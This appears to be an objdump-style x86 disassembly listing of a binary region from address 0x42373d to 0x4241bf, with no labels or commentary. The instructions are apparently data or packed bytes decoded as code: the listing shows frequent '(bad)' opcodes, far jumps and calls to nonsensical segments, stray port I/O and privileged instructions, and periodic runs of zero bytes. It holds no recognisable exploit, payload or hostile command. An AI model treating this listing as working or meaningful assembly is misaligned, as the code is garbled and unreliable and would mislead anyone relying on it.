  42373d:	sahf   
  42373e:	test   al,0xbe
  423740:	cwde   
  423741:	pop    ds
  423742:	ss add al,0x4b
  423745:	popa   
  423746:	xlat   BYTE PTR ds:[ebx]
  423747:	push   ss
  423748:	mov    esp,0x3b1de5e8
  42374d:	adc    al,BYTE PTR ds:0xe1dc691c
  423753:	dec    ebp
  423754:	fsub   QWORD PTR [ebp-0x1d7d37a6]
  42375a:	popa   
  42375b:	or     edi,ebx
  42375d:	rcr    BYTE PTR [ebx],cl
  42375f:	loopne 0x423770
  423761:	pop    ebx
  423762:	cld    
  423763:	sub    eax,0xfe1839af
  423768:	daa    
  423769:	ja     0x423773
  42376b:	cdq    
  42376c:	fiadd  DWORD PTR [eax+0x56b2df9b]
  423772:	repz sti 
  423774:	retf   0xe7b2
  423777:	push   cs
  423778:	stos   BYTE PTR es:[edi],al
  423779:	imul   eax,ebx,0x67
  42377c:	lock jmp 0x423777
  42377f:	pop    ss
  423780:	jb     0x4237b0
  423782:	lahf   
  423783:	out    0x9f,al
  423785:	xor    eax,0xdb94e563
  42378a:	add    al,0xae
  42378c:	cs stos DWORD PTR es:[edi],eax
  42378e:	scas   eax,DWORD PTR es:[edi]
  42378f:	add    BYTE PTR [edi+0x0],bh
	...
  4237f2:	add    BYTE PTR [eax],al
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x445ef03e
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x3e000001
  42380d:	fwait
  42380e:	pop    eax
  42380f:	mov    esi,0xa4c6214a
  423814:	add    DWORD PTR [ebp+eax*8-0x71],esi
  423818:	xchg   edi,eax
  423819:	imul   esp,esi,0xffffffa1
  42381c:	inc    edi
  42381d:	mov    al,ds:0xe3c202be
  423822:	xchg   ebx,eax
  423823:	dec    ecx
  423824:	pop    ecx
  423825:	jp     0x42386c
  423827:	add    DWORD PTR [esi+0x3a],esp
  42382a:	sar    DWORD PTR [edi+0x3f],cl
  42382d:	ins    BYTE PTR es:[edi],dx
  42382e:	inc    ebp
  42382f:	mov    esi,edi
  423831:	xchg   ecx,eax
  423832:	sar    edi,cl
  423834:	das    
  423835:	lods   eax,DWORD PTR ds:[esi]
  423836:	or     eax,0x3bd29203
  42383b:	jl     0x42385a
  42383d:	mov    es,esp
  42383f:	push   0xe72dbb42
  423844:	sbb    al,0x57
  423846:	cmp    dl,ah
  423848:	stc    
  423849:	sub    BYTE PTR [ebp-0x2044d63c],dh
  42384f:	add    dh,dl
  423851:	imul   edx,edx,0x3eabd766
  423857:	sub    al,0x12
  423859:	loopne 0x423881
  42385b:	mov    cl,bl
  42385d:	leave  
  42385e:	add    dl,ch
  423860:	imul   edx,DWORD PTR [esi+edx*1+0x7e],0xffffff81
  423865:	nop
  423866:	popa   
  423867:	fdiv   st,st(3)
  423869:	mov    DWORD PTR [ecx-0x746f55f5],ecx
  42386f:	xor    al,BYTE PTR [ecx]
  423871:	xchg   esi,eax
  423872:	in     eax,dx
  423873:	stc    
  423874:	mov    esi,0x2ca8aa32
  423879:	adc    eax,DWORD PTR [ebp+0x6a2d0e51]
  42387f:	(bad)  
  423880:	jp     0x423853
  423882:	shl    eax,0x7a
  423885:	mov    dh,0xf0
  423887:	add    al,0x27
  423889:	and    BYTE PTR [ecx],al
  42388b:	mov    ch,0xa7
  42388d:	stos   BYTE PTR es:[edi],al
  42388e:	add    eax,ecx
  423890:	push   ds
  423891:	fldcw  WORD PTR [edx-0x46a7fa2a]
  423897:	lock and ebx,ebp
  42389a:	int3   
  42389b:	add    DWORD PTR ss:[eax+eiz*2],eax
  42389f:	adc    eax,0xc439578e
  4238a4:	pop    edi
  4238a5:	test   BYTE PTR [ebx],cl
  4238a7:	push   cs
  4238a8:	rcr    DWORD PTR [esi+0x3caef66e],cl
  4238ae:	scas   eax,DWORD PTR es:[edi]
  4238af:	mov    bh,0x50
  4238b1:	xchg   BYTE PTR [ecx+0x16b09f30],bh
  4238b7:	add    esi,DWORD PTR [esi]
  4238b9:	and    BYTE PTR [ecx+0x5d],0x58
  4238bd:	or     DWORD PTR ds:0xdb40fd78,0x6126f93f
  4238c7:	clc    
  4238c8:	rcl    DWORD PTR [edi+0x4811f991],cl
  4238ce:	(bad)  
  4238d0:	outs   dx,DWORD PTR ds:[esi]
  4238d1:	mov    edi,0xb1d52678
  4238d6:	inc    ecx
  4238d7:	xchg   esp,eax
  4238d8:	adc    BYTE PTR [esi],bh
  4238da:	mov    esi,0xde54a37e
  4238df:	pop    ebp
  4238e0:	xchg   edx,eax
  4238e1:	(bad)  
  4238e2:	mov    bl,0x36
  4238e4:	mov    esi,0xe1d6ccaa
  4238e9:	lods   al,BYTE PTR ds:[esi]
  4238ea:	xor    BYTE PTR [ebx-0x77],bh
  4238ed:	dec    ecx
  4238ee:	enter  0x80ce,0x40
  4238f2:	cmp    DWORD PTR [eax],0xfffffff3
  4238f5:	add    edi,0xffffff9d
  4238f8:	outs   dx,DWORD PTR ds:[esi]
  4238f9:	jge    0x4238f5
  4238fb:	test   DWORD PTR [edx+0x70],esp
  4238fe:	cs ds jbe 0x423973
  423902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423903:	test   DWORD PTR [ebp+eiz*8-0x17],0x353ea93e
  42390b:	imul   esi,DWORD PTR [ebp+0x6d6d3c04],0x0
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xada12bbd
  423982:	and    esi,edx
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0x8d000001,al
  42398d:	jecxz  0x423919
  42398f:	aam    0xb0
  423991:	mov    al,BYTE PTR [edx]
  423993:	mul    DWORD PTR [eax+0x4a]
  423996:	mov    ch,BYTE PTR [edi+0x67]
  423999:	repnz and BYTE PTR [eax],0xa0
  42399d:	fimul  DWORD PTR [edx-0x7b70c34e]
  4239a3:	into   
  4239a4:	mov    ecx,0xcc7b3106
  4239a9:	add    eax,0xf3c30e3e
  4239ae:	push   edi
  4239af:	push   eax
  4239b0:	cld    
  4239b1:	adc    bh,BYTE PTR [esp+edx*1+0x6a]
  4239b5:	ret    
  4239b6:	mov    cs,WORD PTR [eax]
  4239b8:	cmc    
  4239b9:	inc    edi
  4239ba:	in     eax,dx
  4239bb:	rol    BYTE PTR ds:0x1795,cl
  4239c0:	daa    
  4239c1:	mov    esp,0x70e1c66c
  4239c6:	inc    eax
  4239c7:	push   ecx
  4239c8:	push   ebx
  4239c9:	hlt    
  4239ca:	xchg   ebx,esp
  4239cc:	inc    esp
  4239cd:	fwait
  4239ce:	jno    0x4239bb
  4239d0:	rcr    DWORD PTR [ecx],0x5f
  4239d3:	adc    eax,DWORD PTR [ecx+edi*8]
  4239d6:	in     eax,0x51
  4239d8:	fidivr WORD PTR [edi-0x4c415f78]
  4239de:	add    al,0x9c
  4239e0:	pushf  
  4239e1:	shl    BYTE PTR [edi],1
  4239e3:	jp     0x423a29
  4239e5:	adc    eax,DWORD PTR [ebp+0x56]
  4239e8:	lahf   
  4239e9:	ins    DWORD PTR es:[edi],dx
  4239ea:	mov    ds:0x6961f138,al
  4239ef:	dec    esp
  4239f0:	push   es
  4239f1:	je     0x4239ba
  4239f3:	jne    0x4239f9
  4239f5:	pusha  
  4239f6:	scas   al,BYTE PTR es:[edi]
  4239f7:	test   eax,edx
  4239f9:	scas   eax,DWORD PTR es:[edi]
  4239fa:	inc    esi
  4239fb:	jmp    DWORD PTR [ecx+0x1]
  4239fe:	adc    DWORD PTR [eax+edx*8+0x1d],esi
  423a02:	mov    cl,0xb6
  423a04:	popa   
  423a05:	sub    ah,BYTE PTR [edi+0x7f]
  423a08:	popa   
  423a09:	pop    esi
  423a0a:	neg    BYTE PTR ds:0x81288afd
  423a10:	or     eax,0x7effe5a5
  423a15:	std    
  423a16:	xchg   ebp,eax
  423a17:	gs push ecx
  423a19:	imul   eax,DWORD PTR [esi+esi*8+0x2776e538],0x2664a5e8
  423a24:	int3   
  423a25:	jecxz  0x423a3f
  423a27:	jbe    0x4239b1
  423a29:	fs mov esi,0xa523fcd1
  423a2f:	push   es
  423a30:	loopne 0x423aa3
  423a32:	test   al,0xfa
  423a34:	cmp    bl,BYTE PTR [esi]
  423a36:	inc    ebx
  423a37:	cli    
  423a38:	cld    
  423a39:	das    
  423a3a:	dec    eax
  423a3b:	cmc    
  423a3c:	push   ebp
  423a3d:	call   0x7b01:0xc39d2c1b
  423a44:	pushf  
  423a45:	int3   
  423a46:	call   0xd68971d2
  423a4b:	dec    eax
  423a4c:	out    dx,eax
  423a4d:	add    BYTE PTR [ecx-0x7],ch
  423a50:	aam    0x62
  423a52:	ffree  st(1)
  423a54:	imul   edi,ebx,0xf2392571
  423a5a:	push   eax
  423a5b:	dec    ebx
  423a5c:	jge    0x423a66
  423a5e:	and    eax,edx
  423a60:	xor    BYTE PTR [ebx+eiz*4],bh
  423a63:	push   edi
  423a64:	es retf 
  423a66:	xlat   BYTE PTR ds:[ebx]
  423a67:	inc    edi
  423a68:	lahf   
  423a69:	out    0xb,al
  423a6b:	pop    ebp
  423a6c:	imul   ah
  423a6e:	cmp    esi,DWORD PTR [edi-0x63ebc76f]
  423a74:	mov    eax,DWORD PTR [ebp+eax*8+0x47]
  423a78:	out    0x7,al
  423a7a:	sbb    eax,0xa8d8130
  423a7f:	mov    al,0x74
  423a81:	add    edx,0x58
  423a84:	(bad)  
  423a85:	mov    ds:0x9178ca5f,eax
  423a8a:	push   0xe6c2e79b
  423a8f:	xchg   esp,eax
  423a90:	lea    eax,[eax]
	...
  423af2:	add    BYTE PTR [eax],al
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	sbb    DWORD PTR [esi+0x7d243e02],edx
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    eax,0x47000001
  423b0d:	(bad)  
  423b0e:	dec    edi
  423b0f:	mov    dl,0x7b
  423b11:	mov    bl,0x6
  423b13:	test   eax,0x9d3e91d7
  423b18:	mov    edi,0x66a2378
  423b1d:	aam    0xc1
  423b1f:	je     0x423b72
  423b21:	idiv   DWORD PTR [ebx-0x2]
  423b24:	xlat   BYTE PTR ds:[ebx]
  423b25:	sub    eax,0xf9ca6e39
  423b2a:	ja     0x423af7
  423b2c:	mov    edi,0x2d92aeaa
  423b31:	dec    ebp
  423b32:	out    dx,al
  423b33:	iret   
  423b34:	mov    bl,0xb1
  423b36:	push   cs
  423b37:	js     0x423b99
  423b39:	out    0xff,al
  423b3b:	outs   dx,DWORD PTR ds:[esi]
  423b3c:	cld    
  423b3d:	mov    edx,edi
  423b3f:	dec    ecx
  423b40:	add    DWORD PTR [ebx-0x4f1c8d54],eax
  423b46:	test   BYTE PTR [ebp+0x66],bl
  423b49:	pop    es
  423b4a:	shr    BYTE PTR [edx+0x43],1
  423b4d:	add    cl,BYTE PTR ds:0xad09164
  423b53:	js     0x423af9
  423b55:	cmp    BYTE PTR [edi+0x77],0xee
  423b59:	test   eax,0xf6418f22
  423b5e:	ficomp WORD PTR [ebp-0x3d4daae0]
  423b64:	arpl   WORD PTR [ecx+eax*4-0x4a581021],di
  423b6b:	adc    al,0xd0
  423b6d:	stos   BYTE PTR es:[edi],al
  423b6e:	xor    dh,ah
  423b70:	or     DWORD PTR [ebx+0x70],0xffffffc9
  423b74:	mov    bh,0x9b
  423b76:	pop    ebx
  423b77:	adc    BYTE PTR [esi+0x10],0xe4
  423b7b:	mov    al,ds:0x86cda949
  423b80:	stos   DWORD PTR es:[edi],eax
  423b81:	(bad)  
  423b82:	sub    eax,DWORD PTR ds:0x551b713d
  423b88:	mov    BYTE PTR [esi-0xc444784],cl
  423b8e:	stc    
  423b8f:	sbb    ah,BYTE PTR [esi]
  423b91:	aad    0x64
  423b93:	push   es
  423b94:	sbb    al,0xa5
  423b96:	addr16 sahf 
  423b98:	mov    ah,0x73
  423b9a:	and    eax,0xe4c5ef00
  423b9f:	shl    bl,1
  423ba1:	jge    0x423bae
  423ba3:	dec    ecx
  423ba4:	sub    cl,BYTE PTR ds:0xe1d9839e
  423baa:	inc    ebp
  423bab:	mov    bh,0x94
  423bad:	sub    DWORD PTR [edx],edx
  423baf:	jl     0x423bde
  423bb1:	ins    BYTE PTR es:[edi],dx
  423bb2:	or     DWORD PTR [ebx-0x5e],eax
  423bb5:	pop    esi
  423bb6:	mov    dh,BYTE PTR [esi-0x35]
  423bb9:	or     al,0xe2
  423bbb:	loop   0x423b8a
  423bbd:	scas   eax,DWORD PTR es:[edi]
  423bbe:	repz push ecx
  423bc0:	mov    dh,0x89
  423bc2:	mul    dl
  423bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bc5:	pop    edi
  423bc6:	push   edx
  423bc7:	mov    al,ds:0xc26891ad
  423bcc:	retf   
  423bcd:	aaa    
  423bce:	xchg   ecx,eax
  423bcf:	call   0x64988fa4
  423bd4:	and    dl,al
  423bd6:	dec    esp
  423bd7:	call   0xca5b4852
  423bdc:	out    0x26,eax
  423bde:	call   0x313f:0x3db27ff7
  423be5:	xor    eax,0xfa8e4588
  423bea:	imul   esi,DWORD PTR [edx-0x5c3b4f3e],0x2b
  423bf1:	pop    ds
  423bf2:	push   ecx
  423bf3:	icebp  
  423bf4:	pop    ecx
  423bf5:	jmp    DWORD PTR [edi-0x51]
  423bf8:	ror    DWORD PTR ds:0x2bf1c822,cl
  423bfe:	in     al,0x15
  423c00:	mov    dh,0xc5
  423c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c03:	inc    ecx
  423c04:	dec    edx
  423c05:	jecxz  0x423c27
  423c07:	jns    0x423c38
  423c09:	mov    al,0x4d
  423c0b:	je     0x423bb1
  423c0d:	popa   
  423c0e:	fiadd  DWORD PTR fs:[edx+0x0]
	...
  423c72:	add    BYTE PTR [eax],al
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x446617]
  423c81:	imul   DWORD PTR [eax-0x17]
  423c84:	sub    DWORD PTR [esi+0x1],edi
  423c87:	add    BYTE PTR ds:0x9a000001,al
  423c8d:	mov    ecx,0x2d005ed5
  423c92:	cwde   
  423c93:	clc    
  423c94:	int3   
  423c95:	mov    ebx,0x7a19bba5
  423c9a:	sbb    ch,BYTE PTR [ecx-0x2b]
  423c9d:	pop    ecx
  423c9e:	mov    al,ds:0x9f34d57f
  423ca3:	cwde   
  423ca4:	sbb    BYTE PTR [esi-0x2b5ac4e8],al
  423caa:	enter  0x4c75,0x5b
  423cae:	inc    eax
  423caf:	xor    BYTE PTR [edi-0x1f],0xb5
  423cb3:	jne    0x423cf4
  423cb5:	add    al,0x68
  423cb7:	adc    BYTE PTR [eax+edx*1+0x70],0x35
  423cbc:	div    DWORD PTR ds:0x3bf40658
  423cc2:	rol    BYTE PTR [ebp-0x385abddb],1
  423cc8:	inc    eax
  423cc9:	or     esi,esi
  423ccb:	aaa    
  423ccc:	hlt    
  423ccd:	dec    edi
  423cce:	loope  0x423c8f
  423cd0:	div    DWORD PTR [ebp-0x39]
  423cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cd4:	sti    
  423cd5:	and    edx,0x9f3283e
  423cdb:	or     cl,dh
  423cdd:	jge    0x423d4b
  423cdf:	fild   WORD PTR [esi]
  423ce1:	fimul  WORD PTR [edx-0x5f]
  423ce4:	and    eax,0xc845476b
  423ce9:	inc    esi
  423cea:	fld    DWORD PTR [eax-0x1e]
  423ced:	inc    ebp
  423cee:	or     DWORD PTR [edi-0x2],edi
  423cf1:	adc    al,0xd5
  423cf3:	add    eax,0x8b3136e7
  423cf8:	test   DWORD PTR [edx],edi
  423cfa:	mov    esi,0x140c0d24
  423cff:	ret    
  423d00:	jg     0x423d58
  423d02:	xchg   ecx,eax
  423d03:	sub    al,0x35
  423d05:	xchg   edi,eax
  423d06:	mov    ecx,0x6b6d624f
  423d0c:	xor    bl,al
  423d0e:	add    eax,0xdfb97302
  423d13:	push   edx
  423d14:	in     eax,0x5
  423d16:	cwde   
  423d17:	push   cs
  423d18:	push   edi
  423d19:	mov    ch,0x9
  423d1b:	mov    eax,ds:0x7e9f0937
  423d20:	outs   dx,BYTE PTR ds:[esi]
  423d21:	shl    DWORD PTR [eax+eax*2-0x571af32d],0xf4
  423d29:	lahf   
  423d2a:	sub    al,0x6a
  423d2c:	outs   dx,BYTE PTR ds:[esi]
  423d2d:	cli    
  423d2e:	adc    eax,0xbd966eb8
  423d33:	mov    edi,0x1ae73ff7
  423d39:	(bad)  
  423d3a:	clc    
  423d3b:	xchg   BYTE PTR [ecx-0x17],ch
  423d3e:	mov    esi,0x75ba90db
  423d43:	cmp    BYTE PTR [eax+0x28],0x2f
  423d47:	add    al,0x31
  423d49:	(bad)  
  423d4a:	jnp    0x423d9d
  423d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d4d:	jae    0x423cd6
  423d4f:	setnp  BYTE PTR [ecx]
  423d52:	(bad)  
  423d53:	or     eax,0xaf2781ff
  423d58:	aas    
  423d59:	xor    dh,ch
  423d5b:	fcom   DWORD PTR [ebx]
  423d5d:	jne    0x423d66
  423d5f:	imul   BYTE PTR [esi]
  423d61:	sub    bh,BYTE PTR [edx-0x1148bd1]
  423d67:	adc    esp,esi
  423d69:	jmp    0x54f6617
  423d6e:	out    dx,al
  423d6f:	cmp    BYTE PTR [esi],ah
  423d71:	fldcw  WORD PTR [ebp-0x21]
  423d74:	jl     0x423da4
  423d76:	push   cs
  423d77:	dec    ebp
  423d78:	mov    edx,DWORD PTR [esi]
  423d7a:	cmp    bl,BYTE PTR [ebx-0x66]
  423d7d:	and    al,0x28
  423d7f:	sub    eax,0xfffffff2
  423d82:	mov    ebp,0x96f314e8
  423d87:	inc    esi
  423d88:	push   0x77e5f7a3
  423d8d:	jns    0x423d7b
  423d8f:	(bad)  
  423d90:	mov    edi,0x0
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x32656ad2],esp
  423e03:	dec    ebp
  423e04:	cs jg  0x423e08
  423e07:	add    BYTE PTR ds:0x3000001,al
  423e0d:	addr16 mov bh,0x6a
  423e10:	xor    ecx,DWORD PTR ds:0x9f69
  423e15:	or     esi,edi
  423e17:	push   edx
  423e18:	ret    0xfb46
  423e1b:	push   ebp
  423e1c:	sub    eax,0xcc82c161
  423e21:	int    0x76
  423e23:	test   eax,0xe157618c
  423e28:	sbb    BYTE PTR [ebx+0x7082cc94],ah
  423e2e:	outs   dx,DWORD PTR ds:[esi]
  423e2f:	mov    ds:0x49a878cf,al
  423e34:	std    
  423e35:	inc    ebp
  423e36:	sti    
  423e37:	cld    
  423e38:	jg     0x423e7c
  423e3a:	cld    
  423e3b:	sub    DWORD PTR [ebx-0x35],eax
  423e3e:	int3   
  423e3f:	adc    dh,BYTE PTR [ebx+0x79111f64]
  423e45:	pop    ds
  423e46:	jae    0x423e2e
  423e48:	popf   
  423e49:	pop    edx
  423e4a:	loope  0x423ea9
  423e4c:	loopne 0x423ebb
  423e4e:	adc    BYTE PTR [ecx-0x2b689e61],0x2f
  423e55:	jge    0x423ec6
  423e57:	sbb    al,0xd2
  423e59:	and    al,0x1c
  423e5b:	jb     0x423ec6
  423e5d:	push   ebx
  423e5e:	std    
  423e5f:	out    dx,al
  423e60:	sbb    DWORD PTR [esi+ecx*8-0x56],ebp
  423e64:	daa    
  423e65:	xor    ebx,DWORD PTR [ebx+0x67]
  423e68:	sbb    DWORD PTR [edi],eax
  423e6a:	adc    BYTE PTR [ebp+0x1a],ah
  423e6d:	pop    edi
  423e6e:	dec    eax
  423e6f:	mov    al,0x83
  423e71:	inc    edx
  423e72:	or     al,0x5d
  423e74:	and    al,0x4f
  423e76:	mov    eax,0xb845076f
  423e7b:	int    0xc5
  423e7d:	gs xchg ecx,eax
  423e7f:	(bad)  
  423e80:	adc    edi,esp
  423e82:	jg     0x423e87
  423e84:	adc    BYTE PTR [edi+0x2eb2f9ca],dh
  423e8a:	popf   
  423e8b:	adc    al,0x2c
  423e8d:	dec    ebp
  423e8e:	hlt    
  423e8f:	jno    0x423ead
  423e91:	fimul  DWORD PTR [edx+0x107f7739]
  423e97:	push   ebx
  423e98:	xchg   edi,eax
  423e99:	repnz cli 
  423e9b:	sub    al,0xff
  423e9d:	xor    esp,DWORD PTR [ebx+eax*8-0x4162da7a]
  423ea4:	aaa    
  423ea5:	and    al,0x9c
  423ea7:	clc    
  423ea8:	mov    al,ds:0xd7f00edb
  423ead:	inc    ecx
  423eae:	inc    esp
  423eaf:	call   0x7b04:0xfdb6abf0
  423eb6:	inc    ebp
  423eb7:	js     0x423e88
  423eb9:	mov    ss,WORD PTR [eax]
  423ebb:	push   esi
  423ebc:	lea    ebp,[esi+0xd3a92ba]
  423ec2:	dec    eax
  423ec3:	push   esp
  423ec4:	and    bh,bl
  423ec6:	xor    BYTE PTR [edi+0x23e3cd15],0x6
  423ecd:	(bad)  
  423ece:	(bad)  
  423ed0:	mov    al,BYTE PTR [eax-0x2a]
  423ed3:	mov    fs,WORD PTR [ebx]
  423ed5:	retf   0x6942
  423ed8:	or     edi,DWORD PTR [ecx+0x537f27f2]
  423ede:	jne    0x423ea7
  423ee0:	cmp    esp,DWORD PTR [edi+0x55]
  423ee3:	cmp    DWORD PTR [eax+0x2fb217bf],0x45
  423eea:	stos   DWORD PTR es:[edi],eax
  423eeb:	xchg   BYTE PTR [edi+0x20],al
  423eee:	fwait
  423eef:	push   ecx
  423ef0:	pop    eax
  423ef1:	and    al,BYTE PTR cs:[edi+eax*1-0x225fb395]
  423ef9:	stc    
  423efa:	cmc    
  423efb:	jp     0x423e91
  423efd:	sub    DWORD PTR ds:0x3501deb7,0x679169fb
  423f07:	inc    ebp
  423f08:	(bad)  
  423f09:	or     al,0xbf
  423f0b:	cmp    ebx,DWORD PTR [edx]
  423f0d:	rcr    BYTE PTR [ebx+0xcdc9],1
	...
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	out    dx,eax
  423f81:	sub    esi,DWORD PTR [eax+0x18033dd]
  423f87:	add    BYTE PTR ds:0x77000001,al
  423f8d:	mov    eax,0xb98edbf0
  423f92:	add    al,0x82
  423f94:	or     ch,BYTE PTR [eax-0x2e]
  423f97:	ins    DWORD PTR es:[edi],dx
  423f98:	fimul  DWORD PTR [ecx]
  423f9a:	sbb    eax,0x8dfcddaa
  423f9f:	imul   ebp,DWORD PTR [ebx-0xf],0x76
  423fa3:	and    BYTE PTR [edx-0x58],dh
  423fa6:	push   ecx
  423fa7:	dec    edi
  423fa8:	and    eax,0x798692e6
  423fad:	aad    0x94
  423faf:	popa   
  423fb0:	adc    bh,BYTE PTR [esi+eiz*1-0x5]
  423fb4:	neg    DWORD PTR [ecx-0x67]
  423fb7:	bt     DWORD PTR [eax+0xf],edx
  423fbb:	jbe    0xcf1e444a
  423fc1:	(bad)  
  423fc2:	in     al,dx
  423fc3:	sbb    esp,DWORD PTR [eax]
  423fc5:	aad    0xe5
  423fc7:	idiv   ebx
  423fc9:	es sub al,0x3f
  423fcc:	mov    cs:0x9ac14b64,eax
  423fd2:	sub    eax,0x3a5185ed
  423fd7:	mov    eax,ds:0xab376758
  423fdc:	imul   edi,DWORD PTR es:[ebx-0x72],0x4c
  423fe1:	push   esi
  423fe2:	jne    0x423ff1
  423fe4:	jmp    0x54c0a4ec
  423fe9:	sbb    al,0xb5
  423feb:	dec    ecx
  423fec:	sti    
  423fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fee:	pop    edx
  423fef:	add    BYTE PTR [ebx-0x4fccfcda],dl
  423ff5:	outs   dx,BYTE PTR ds:[esi]
  423ff6:	fwait
  423ff7:	inc    edi
  423ff8:	rol    DWORD PTR [edx+0x24acc03e],cl
  423ffe:	mov    esi,DWORD PTR [ebp+0x2dbe579a]
  424004:	xchg   esp,eax
  424005:	mov    bh,0xd6
  424007:	and    DWORD PTR [esi+0x37],esi
  42400a:	add    esi,DWORD PTR [eax]
  42400c:	cmp    DWORD PTR [eax+0x17],esp
  42400f:	out    0x19,eax
  424011:	jmp    0xec4e:0x2851efda
  424018:	dec    ecx
  424019:	bound  edi,QWORD PTR [edx+0x69]
  42401c:	xchg   ebx,eax
  42401d:	nop
  42401e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42401f:	pop    es
  424020:	loopne 0x423fa4
  424022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424023:	cmp    bl,ah
  424025:	inc    ebp
  424026:	sub    al,0x23
  424028:	add    DWORD PTR [ebx-0x2a289040],edi
  42402e:	in     eax,dx
  42402f:	aam    0x40
  424031:	and    bh,ah
  424033:	xchg   esi,eax
  424034:	jne    0x423fc2
  424036:	sbb    BYTE PTR [ecx],cl
  424038:	clc    
  424039:	(bad)
  42403c:	sub    ch,BYTE PTR [ebp-0xd]
  42403f:	cld    
  424040:	jne    0x424038
  424042:	cdq    
  424043:	ja     0x424046
  424045:	sub    DWORD PTR [esi+eiz*2],0x3a
  424049:	aam    0x6e
  42404b:	fsub   st(1),st
  42404d:	xchg   ebp,eax
  42404e:	sub    BYTE PTR [eax],dh
  424050:	repz enter 0x1383,0xee
  424055:	ror    ecx,1
  424057:	popf   
  424058:	jnp    0x423fe1
  42405a:	cs pop ss
  42405c:	arpl   WORD PTR [esi+eax*1+0x53a8514f],sp
  424063:	mov    ds:0xa7c45848,al
  424068:	sbb    al,0x32
  42406a:	sub    eax,0xa000be27
  42406f:	scas   eax,DWORD PTR es:[edi]
  424070:	or     edi,ecx
  424072:	sbb    edi,edi
  424074:	sbb    eax,0xe0e93d03
  424079:	jne    0x4240a6
  42407b:	pop    es
  42407c:	into   
  42407d:	fild   QWORD PTR [esi+0x60]
  424080:	inc    edi
  424081:	mov    ecx,0x158c178d
  424086:	sub    bh,BYTE PTR [edi+0xb1ee24f]
  42408c:	xchg   esp,eax
  42408d:	pop    es
  42408e:	mov    ah,0xa1
  424090:	xchg   edi,eax
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	test   al,0xf8
  424102:	outs   dx,DWORD PTR ds:[esi]
  424103:	push   edx
  424104:	cmp    BYTE PTR [ecx+0x1050001],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	mov    DWORD PTR gs:[eax+0x42793de2],ecx
  424113:	fsubr  DWORD PTR [ebx]
  424115:	es lahf 
  424117:	mov    cl,0x20
  424119:	sub    cl,bh
  42411b:	cmp    DWORD PTR [ebp*2+0xe97187d],edi
  424122:	or     al,0xa0
  424124:	ins    DWORD PTR es:[edi],dx
  424125:	test   al,0xfc
  424127:	mov    esp,DWORD PTR [eax+ebp*1-0x2cde9425]
  42412e:	and    BYTE PTR [esi+0x39b7ef81],dl
  424134:	jnp    0x4240f3
  424136:	mov    cl,0xdf
  424138:	push   0xbbf36f54
  42413d:	sub    BYTE PTR [esi+0x271b795],bl
  424143:	add    al,0xc3
  424145:	jne    0x42410c
  424147:	jle    0x424133
  424149:	push   ds
  42414a:	ja     0x4240e0
  42414c:	ins    BYTE PTR es:[edi],dx
  42414d:	push   esi
  42414e:	iret   
  42414f:	push   ss
  424150:	mov    edx,0xce37761e
  424155:	out    0xb0,eax
  424157:	sub    DWORD PTR [ebp-0x50272b15],0x3cdbff1e
  424161:	add    dh,ch
  424163:	and    eax,ebx
  424165:	aas    
  424166:	pop    ebp
  424167:	adc    BYTE PTR [edx],0xa
  42416a:	cdq    
  42416b:	repz jle 0x424138
  42416e:	cli    
  42416f:	dec    esp
  424170:	mov    ds:0xcfb45aca,eax
  424175:	xchg   edi,eax
  424176:	stos   BYTE PTR es:[edi],al
  424177:	cmp    al,BYTE PTR [edi]
  424179:	iret   
  42417a:	mov    ds:0xae936e77,eax
  42417f:	inc    ebx
  424180:	push   ds
  424181:	les    esp,FWORD PTR [eax+0x401fdc01]
  424187:	fisttp QWORD PTR [edi]
  424189:	test   al,0x74
  42418b:	ins    DWORD PTR es:[edi],dx
  42418c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42418d:	lock cld 
  42418f:	add    ebp,edx
  424191:	mov    dh,0xee
  424193:	(bad)  
  424195:	fimul  DWORD PTR [edx+0x64]
  424198:	adc    DWORD PTR [esi-0x7b],0x3f5cd7f2
  42419f:	mov    BYTE PTR [esp+ecx*4+0x1f],bh
  4241a3:	add    al,0xfd
  4241a5:	add    eax,DWORD PTR [ebx+0x7f]
  4241a8:	dec    BYTE PTR [eax-0x14153942]
  4241ae:	sub    ch,dh
  4241b0:	les    esi,FWORD PTR [ebx+ebx*4-0x45196a40]
  4241b7:	pop    ecx
  4241b8:	fistp  QWORD PTR [esi+0x68]
  4241bb:	or     al,0x7a
  4241bd:	je     0x424208
  4241bf:	outs   dx,BYTE PTR ds:[esi]
